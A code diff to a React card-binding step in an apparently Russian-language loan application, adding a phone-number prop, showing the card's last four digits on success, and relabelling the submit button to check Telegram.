@@ -8,9 +8,10 @@ interface CardBindingStepProps {
   onSuccess: () => void;
   onSubmit: () => void;
   isSubmitting: boolean;
+  phoneNumber: string;
 }
 
-const CardBindingStep: React.FC<CardBindingStepProps> = ({ onSuccess, onSubmit, isSubmitting }) => {
+const CardBindingStep: React.FC<CardBindingStepProps> = ({ onSuccess, onSubmit, isSubmitting, phoneNumber }) => {
   const [cardNumber, setCardNumber] = useState('');
   const [expiryDate, setExpiryDate] = useState('');
   const [cvv, setCvv] = useState('');
@@ -67,7 +68,7 @@ const CardBindingStep: React.FC<CardBindingStepProps> = ({ onSuccess, onSubmit, 
         </div>
         <div className="space-y-2">
           <h3 className="text-xl font-bold text-green-600">Карта успешно привязана!</h3>
-          <p className="text-gray-600">Теперь вы можете получить займ на эту карту</p>
+          <p className="text-gray-600">Карта {cardNumber.slice(-4)} готова к получению займа</p>
         </div>
         
         <Button
@@ -78,12 +79,12 @@ const CardBindingStep: React.FC<CardBindingStepProps> = ({ onSuccess, onSubmit, 
           {isSubmitting ? (
             <div className="flex items-center gap-2">
               <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-              Отправляем заявку...
+              Проверяем Telegram...
             </div>
           ) : (
             <div className="flex items-center justify-center gap-2">
-              <Icon name="Send" size={16} />
-              Отправить заявку
+              <Icon name="MessageCircle" size={16} />
+              Проверить Telegram
             </div>
           )}
         </Button>
